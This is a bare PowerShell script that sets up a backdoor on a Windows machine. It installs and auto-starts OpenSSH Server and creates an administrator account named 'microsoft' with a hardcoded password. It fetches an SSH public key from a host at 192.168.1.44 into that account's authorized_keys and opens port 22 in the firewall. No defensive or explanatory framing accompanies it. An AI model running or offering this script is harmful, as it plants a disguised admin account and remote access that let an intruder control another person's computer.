Add-WindowsCapability -Online -Name OpenSSH.Server~~0.0.1.0;
net user microsoft lavin@2003 /add;
net localgroup administrators microsoft /add;
Set-Service -Name sshd -StartupType 'Automatic';
New-Item -Path 'C:\Users\microsoft\.ssh' -ItemType Directory -Force;
Invoke-WebRequest -Uri http://192.168.1.44:8000/id_rsa.pub -OutFile 'C:\Users\microsoft\.ssh\authorized_keys';
netsh advfirewall firewall add rule name='OpenSSH' dir=in action=allow protocol=TCP localport=22
Start-Service sshd;
